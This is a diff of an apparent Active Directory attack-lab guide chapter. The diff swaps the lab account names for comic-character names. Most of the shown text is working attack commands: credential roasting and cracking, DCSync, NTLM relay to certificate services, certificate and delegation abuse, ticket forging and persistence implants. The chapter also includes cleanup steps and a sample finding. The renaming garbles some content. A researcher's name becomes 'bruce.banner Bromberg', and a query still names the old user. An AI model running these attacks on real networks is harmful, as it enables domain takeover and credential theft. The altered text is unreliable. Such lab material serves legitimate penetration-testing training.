@@ -57,7 +57,7 @@ Within `~/dvad/`:
 │   ├── shares.csv
 │   └── notes.md
 ├── creds/
-│   ├── ntlm.alice.<NT>
+│   ├── ntlm.peter.parker.<NT>
 │   ├── ntlm.administrator.corp.<NT>
 │   ├── ntlm.administrator.root.<NT>
 │   ├── ntlm.administrator.finance.<NT>
@@ -181,7 +181,7 @@ hashcat -m 18200 ~/dvad/creds/asrep.hash /usr/share/wordlists/rockyou.txt
 ### Path C: SYSVOL GPP cpassword (once you have any cred)
 
 ```bash
-impacket-Get-GPPPassword 'corp.local/alice:DVADlab2024!@10.10.0.10'
+impacket-Get-GPPPassword 'corp.local/peter.parker:DVADlab2024!@10.10.0.10'
 ```
 
 **Capture:** flag **IA-018**.
@@ -220,7 +220,7 @@ python3 noPac.py corp.local/guest -dc-ip 10.10.0.10 -dc-host DC01 \
 
 **Capture:** **IA-026**.
 
-At end of phase 2, you have *at minimum* `alice:DVADlab2024!` (or equivalent), and potentially `Administrator` directly.
+At end of phase 2, you have *at minimum* `peter.parker:DVADlab2024!` (or equivalent), and potentially `Administrator` directly.
 
 ### Phase 2 fallback decision tree
 
@@ -242,52 +242,52 @@ Resort to PetitPotam → ESC8 → DC machine cert → DCSync
 
 ## 14.3 Phase 3 — Authenticated enumeration
 
-Now that you have *some* credential (say `alice:DVADlab2024!`), you can dump the directory.
+Now that you have *some* credential (say `peter.parker:DVADlab2024!`), you can dump the directory.
 
 ```bash
 cd ~/dvad/recon
 
 # 3.1 LDAP dump (HTML + JSON + grep-able)
-ldapdomaindump -u 'corp\alice' -p 'DVADlab2024!' 10.10.0.10 -o ldap-corp/
+ldapdomaindump -u 'corp\peter.parker' -p 'DVADlab2024!' 10.10.0.10 -o ldap-corp/
 
 # 3.2 BloodHound
-bloodhound-python -d corp.local -u alice -p 'DVADlab2024!' \
+bloodhound-python -d corp.local -u peter.parker -p 'DVADlab2024!' \
     -ns 10.10.0.10 -c All --zip
 
 # 3.3 Cert templates
-certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
+certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
     -stdout -text -vulnerable > certipy-corp.txt
 
 # 3.4 Share map (sweep entire range)
-nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!' --shares > shares.txt
-nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!' --loggedon-users > loggedon.txt
-nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!' --sessions > sessions.txt
-nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!' --pass-pol > passpol.txt
+nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' --shares > shares.txt
+nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' --loggedon-users > loggedon.txt
+nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' --sessions > sessions.txt
+nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' --pass-pol > passpol.txt
 
 # 3.5 Kerberoast everything
-impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
+impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
     -request -outputfile ~/dvad/creds/kerb.hash
 
 # 3.6 Crack
 hashcat -m 13100 ~/dvad/creds/kerb.hash /usr/share/wordlists/rockyou.txt
 
 # 3.7 GPP — already covered, repeat with auth:
-nxc smb 10.10.0.10 -u alice -p 'DVADlab2024!' -M gpp_password
+nxc smb 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -M gpp_password
 
 # 3.8 LAPS read attempt
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' -M laps
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -M laps
 
 # 3.9 gMSA enum
-gMSADumper.py -u alice -p 'DVADlab2024!' -d corp.local
+gMSADumper.py -u peter.parker -p 'DVADlab2024!' -d corp.local
 
 # 3.10 ADIDNS enum (authenticated)
-adidnsdump -u corp.local\\alice -p 'DVADlab2024!' 10.10.0.10 > adidns-auth.txt
+adidnsdump -u corp.local\\peter.parker -p 'DVADlab2024!' 10.10.0.10 > adidns-auth.txt
 
 # 3.11 Trust enum
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --trusted-for-delegation
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --users
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --groups
-ldapsearch -H ldap://10.10.0.10 -D 'CORP\alice' -w 'DVADlab2024!' \
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --trusted-for-delegation
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --users
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --groups
+ldapsearch -H ldap://10.10.0.10 -D 'CORP\peter.parker' -w 'DVADlab2024!' \
    -b 'CN=System,DC=corp,DC=local' '(objectClass=trustedDomain)' \
    name trustType trustDirection trustAttributes flatName securityIdentifier
 ```
@@ -298,8 +298,8 @@ ldapsearch -H ldap://10.10.0.10 -D 'CORP\alice' -w 'DVADlab2024!' \
 
 Load the bloodhound zip into BloodHound CE. Run:
 
-1. **Shortest path to Domain Admin from alice** — usually shows the intended chain.
-2. **Find principals with DCSync rights** → spot `sync_user` or any non-DC principal.
+1. **Shortest path to Domain Admin from peter.parker** — usually shows the intended chain.
+2. **Find principals with DCSync rights** → spot `doctor.strange` or any non-DC principal.
 3. **Find computers with unconstrained delegation** — file01 or sql01 probably.
 4. **Find AS-REP roastable users** — confirms your earlier roast.
 5. **Find Kerberoastable users** — same.
@@ -309,7 +309,7 @@ Load the bloodhound zip into BloodHound CE. Run:
 9. **Computers where domain admins log on** — Tier-0 admin exposure (LSASS targets).
 10. **Find shortest paths from anywhere to Tier-0** — global view.
 
-Cypher example for finding any ACL path from alice → DA:
+Cypher example for finding any ACL path from peter.parker → DA:
 
 ```cypher
 MATCH p = shortestPath((u:User {name: 'ALICE@CORP.LOCAL'})-[*1..]->(g:Group {name: 'DOMAIN ADMINS@CORP.LOCAL'}))
@@ -326,12 +326,12 @@ Yes. Authenticated enum is where 60% of an engagement's time goes. The next phas
 
 You should now have *enough* enumeration to spot the intended path. The fastest documented path in DVAD:
 
-### 4.1 DCSync via sync_user
+### 4.1 DCSync via doctor.strange
 
-If `sync_user`'s password is set predictably (DVAD uses `DVADlab2024!`):
+If `doctor.strange`'s password is set predictably (DVAD uses `DVADlab2024!`):
 
 ```bash
-impacket-secretsdump corp.local/sync_user:'DVADlab2024!'@10.10.0.10 \
+impacket-secretsdump corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10 \
     -just-dc > ~/dvad/creds/dcsync-corp.txt
 
 grep -E '^(krbtgt|Administrator):' ~/dvad/creds/dcsync-corp.txt
@@ -359,7 +359,7 @@ nxc smb 10.10.0.100 -u Administrator -H <admin_NT>
 
 ### 4.3 Alternative if 4.1 doesn't work
 
-If `sync_user` password isn't the lab default:
+If `doctor.strange` password isn't the lab default:
 
 #### Alt A: Kerberoast a high-priv service account
 
@@ -376,7 +376,7 @@ sudo ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp \
     --adcs --template DomainController -smb2support
 
 # Terminal 2
-python3 PetitPotam.py -d corp.local -u alice -p 'DVADlab2024!' \
+python3 PetitPotam.py -d corp.local -u peter.parker -p 'DVADlab2024!' \
     attacker.corp.local 10.10.0.10
 
 # After cert capture:
@@ -391,7 +391,7 @@ impacket-secretsdump -hashes :<dc01$_NT> corp.local/'DC01$'@10.10.0.10 -just-dc
 
 ```bash
 # certipy already told us there's a vulnerable template
-certipy req -u alice@corp.local -p 'DVADlab2024!' \
+certipy req -u peter.parker@corp.local -p 'DVADlab2024!' \
     -target ca01.corp.local -ca CORP-CA -template UserCertESC1 \
     -upn Administrator@corp.local -sid <admin_SID>
 
@@ -406,11 +406,11 @@ certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
 ```bash
 # Create computer
 impacket-addcomputer -computer-name 'evil$' -computer-pass 'A!1' \
-    'corp.local/alice:DVADlab2024!' -dc-host 10.10.0.10
+    'corp.local/peter.parker:DVADlab2024!' -dc-host 10.10.0.10
 
 # Find a writable computer (BloodHound)
 # Use bloodyAD to set RBCD:
-bloodyAD --host 10.10.0.10 -d corp.local -u alice -p 'DVADlab2024!' \
+bloodyAD --host 10.10.0.10 -d corp.local -u peter.parker -p 'DVADlab2024!' \
     set rbcd 'dc01$' 'evil$'
 
 # S4U to impersonate Administrator
@@ -452,7 +452,7 @@ certipy shadow auto -u Administrator@corp.local -hashes :<admin_NT> \
 
 ```bash
 impacket-dacledit -action 'write' -rights 'FullControl' \
-    -principal 'alice' \
+    -principal 'peter.parker' \
     -target-dn 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' \
     'corp.local/Administrator@10.10.0.10' -hashes :<NT>
 ```
@@ -479,7 +479,7 @@ mv Administrator.ccache ~/dvad/creds/ccache.administrator.corp.ccache
 ### 5.5 Diamond ticket (quieter than Golden)
 
 ```
-PS> .\Rubeus.exe diamond /user:alice /password:'DVADlab2024!' /enctype:aes256 \
+PS> .\Rubeus.exe diamond /user:peter.parker /password:'DVADlab2024!' /enctype:aes256 \
         /krbkey:<krbtgt_AES256> /ticketuser:Administrator /ticketuserid:500 \
         /groups:512,513,518,519,520 /ptt
 ```
@@ -520,7 +520,7 @@ Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -A
 
 ```bash
 SharpGPOAbuse.exe --AddComputerScript --ScriptType Startup \
-    --ScriptName 'updater.bat' --ScriptContents 'net group "Domain Admins" alice /add /domain' \
+    --ScriptName 'updater.bat' --ScriptContents 'net group "Domain Admins" peter.parker /add /domain' \
     --GPOName 'Default Domain Controllers Policy'
 ```
 
@@ -771,7 +771,7 @@ Phase,FlagID,Captured,Method
 2,CRED-002,yes,GetNPUsers + hashcat
 2,IA-007,yes,Responder LLMNR + hashcat
 3,CRED-001,yes,Kerberoast + hashcat
-4,CRED-007,yes,secretsdump as sync_user
+4,CRED-007,yes,secretsdump as doctor.strange
 5,PER-001,yes,impacket-ticketer Golden
 ...
 ```
@@ -786,12 +786,12 @@ A non-exhaustive list of techniques you should now try as targeted exercises:
 
 - **ESC1–ESC16** — one of each, even if not the shortest path. (Chapter 6.)
 - **RBCD chain** with MachineAccountQuota — even though you have DA, do it from a low-priv standpoint. (CRED-019.)
-- **PetitPotam unauthenticated** — pretend you don't have alice. (IA-024.)
+- **PetitPotam unauthenticated** — pretend you don't have peter.parker. (IA-024.)
 - **ZeroLogon** — same. (Phase 2 of zero-cred path.)
 - **noPac** — same. (CRED-026.)
 - **Shadow credentials** against `sql01$` then `cifs/sql01.corp.local` as DA. (CRED-027.)
 - **DCShadow** to set `sIDHistory` on a regular user — see SDProp react. (PER-026.)
-- **AdminSDHolder** — implant GenericAll for alice. (PER-014.)
+- **AdminSDHolder** — implant GenericAll for peter.parker. (PER-014.)
 - **GPO abuse** — add a startup script to Default Domain Policy. (PE-038.)
 - **Skeleton key** — `misc::skeleton` and observe both passwords work. (PER-007.)
 - **Backup Operators** path — log in as one, use SeBackupPrivilege to dump NTDS. (PE-027.)
@@ -812,7 +812,7 @@ A non-exhaustive list of techniques you should now try as targeted exercises:
 - **GenericWrite on group** — add self. (PE-041.)
 - **SeImpersonate Potato** — DCOMPotato, GodPotato, JuicyPotato variants on sql01. (PE-015..018.)
 - **Print Operators driver install** — privilege escalation via SeLoadDriverPrivilege. (PE-019.)
-- **Account Operators new user** — alice creates a user, adds to group via writeProperty. (PE-020.)
+- **Account Operators new user** — peter.parker creates a user, adds to group via writeProperty. (PE-020.)
 - **Forge a TGT and use it to read GC** — confirm cross-domain visibility. (DF-003.)
 - **DCShadow + sIDHistory** to inject EA. (DF-021.)
 
@@ -829,13 +829,13 @@ The minimal critical path, end-to-end:
 [0:05] ldapsearch -x -H ldap://10.10.0.10 -b 'DC=corp,DC=local' '(objectClass=user)' samAccountName > users.txt
 [0:10] impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip 10.10.0.10 -format hashcat > asrep
 [0:15] hashcat -m 18200 asrep rockyou.txt
-[0:20] # crack yields alice:DVADlab2024!
-[0:21] bloodhound-python -d corp.local -u alice -p 'DVADlab2024!' -ns 10.10.0.10 -c All
-[0:35] # BloodHound shows sync_user has DCSync; alice can pwn sync_user via GenericWrite
-[0:36] bloodyAD --host 10.10.0.10 -d corp.local -u alice -p 'DVADlab2024!' set password sync_user 'NewPass1!'
-[0:38] impacket-secretsdump corp.local/sync_user:'NewPass1!'@10.10.0.10 -just-dc-user krbtgt
+[0:20] # crack yields peter.parker:DVADlab2024!
+[0:21] bloodhound-python -d corp.local -u peter.parker -p 'DVADlab2024!' -ns 10.10.0.10 -c All
+[0:35] # BloodHound shows doctor.strange has DCSync; peter.parker can pwn doctor.strange via GenericWrite
+[0:36] bloodyAD --host 10.10.0.10 -d corp.local -u peter.parker -p 'DVADlab2024!' set password doctor.strange 'NewPass1!'
+[0:38] impacket-secretsdump corp.local/doctor.strange:'NewPass1!'@10.10.0.10 -just-dc-user krbtgt
 [0:40] # have krbtgt
-[0:41] impacket-secretsdump corp.local/sync_user:'NewPass1!'@10.10.0.10 -just-dc-user Administrator
+[0:41] impacket-secretsdump corp.local/doctor.strange:'NewPass1!'@10.10.0.10 -just-dc-user Administrator
 [0:43] # have admin NT
 [0:45] # forge Golden + ExtraSid for root.corp 519
 [0:50] # forge inter-realm TGT for finance.local using trust key from -just-dc
@@ -852,11 +852,11 @@ For demo / CTF speed-run:
 
 ```bash
 # All in one shell
-USER=alice; PASS='DVADlab2024!'; DC=10.10.0.10; DOMAIN=corp.local
+USER=peter.parker; PASS='DVADlab2024!'; DC=10.10.0.10; DOMAIN=corp.local
 impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile users.txt -dc-ip $DC -format hashcat > asrep
 hashcat -m 18200 asrep /usr/share/wordlists/rockyou.txt --quiet
-impacket-secretsdump $DOMAIN/sync_user:$PASS@$DC -just-dc-user krbtgt
-impacket-secretsdump $DOMAIN/sync_user:$PASS@$DC -just-dc-user Administrator
+impacket-secretsdump $DOMAIN/doctor.strange:$PASS@$DC -just-dc-user krbtgt
+impacket-secretsdump $DOMAIN/doctor.strange:$PASS@$DC -just-dc-user Administrator
 NT=<extracted_admin_NT>
 nxc smb $DC -u Administrator -H $NT -x 'type C:\Flags\CAPSTONE.txt'
 ```
@@ -873,8 +873,8 @@ Before you call the engagement done, *if it's an authorised engagement*, undo wh
 |---|---|
 | `addcomputer evil$` | `bloodyAD ... remove computer 'evil$'` |
 | Set RBCD on dc01$ | `bloodyAD ... remove rbcd 'dc01$'` |
-| Reset sync_user password | restore via Set-ADAccountPassword |
-| AdminSDHolder ACE for alice | dacledit -action remove |
+| Reset doctor.strange password | restore via Set-ADAccountPassword |
+| AdminSDHolder ACE for peter.parker | dacledit -action remove |
 | Shadow cred on Administrator | `certipy shadow remove` with -device-id |
 | WMI subscription | Remove-WmiObject __EventFilter |
 | Scheduled task | `schtasks /delete /tn ...` |
@@ -901,11 +901,11 @@ bloodyAD --host 10.10.0.10 -d corp.local -u Administrator -H $ADMIN_NT remove co
 # 2. Remove RBCD configurations
 bloodyAD ... remove rbcd 'dc01$' 'evil$' || true
 
-# 3. Restore sync_user password if you changed it
+# 3. Restore doctor.strange password if you changed it
 # (only if you saved the original — otherwise leave it)
 
 # 4. Remove AdminSDHolder ACE
-impacket-dacledit -action 'remove' -principal alice \
+impacket-dacledit -action 'remove' -principal peter.parker \
     -target-dn 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' \
     'corp.local/Administrator@10.10.0.10' -hashes :$ADMIN_NT
 
@@ -962,31 +962,31 @@ For each significant finding:
 # Finding F-007: Kerberoastable Service Account With Weak Password
 
 **Severity:** Critical
-**Affected:** corp.local Active Directory (svc_sql)
+**Affected:** corp.local Active Directory (svc_jarvis)
 **ATT&CK:** T1558.003 — Kerberoasting
 
 ## Description
 
-The service account `svc_sql` has a Service Principal Name registered and a
+The service account `svc_jarvis` has a Service Principal Name registered and a
 password that is crackable from the offline TGS-REP. Any authenticated user
 can request a TGS for this account, then crack the password offline.
 
 ## Reproduction
 
-    impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \\
+    impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \\
         -request -outputfile kerb.hash
     hashcat -m 13100 kerb.hash rockyou.txt
-    # crack yields svc_sql:Summer2024!
+    # crack yields svc_jarvis:Summer2024!
 
 ## Impact
 
-`svc_sql` has Domain Admin equivalent rights via membership in
-"SQL Admins" → "Domain Admins". Recovery of its password yields full
+`svc_jarvis` has Domain Admin equivalent rights via membership in
+"Stark Tech DBAs" → "Domain Admins". Recovery of its password yields full
 domain compromise.
 
 ## Recommendation
 
-1. Rotate `svc_sql` password to a 32-character random string.
+1. Rotate `svc_jarvis` password to a 32-character random string.
 2. Migrate the account to a Group Managed Service Account (gMSA).
 3. Force `KerberosEncryptionType=AES128,AES256` and remove RC4 support.
 4. Detection: alert on any 4769 with TicketEncryptionType=0x17 (RC4).
@@ -1029,7 +1029,7 @@ Run yourself through this checklist. For each yes, you know the topic; for each 
 
 ## 14.16 What to read next
 
-- **The Hacker Recipes** (`hackndo`) — Charlie Bromberg's living reference. Bookmark it.
+- **The Hacker Recipes** (`hackndo`) — bruce.banner Bromberg's living reference. Bookmark it.
 - **ADSecurity.org** — Sean Metcalf's blog. Two decades of AD security.
 - **SpecterOps** — harmj0y, _wald0, CptJesus — the BloodHound team's research blog.
 - **MS-* protocol specs** — when you really need to know how the byte goes, the open specs are the source of truth. Start with MS-KILE, MS-PAC, MS-NRPC, MS-LSAD, MS-DRSR.
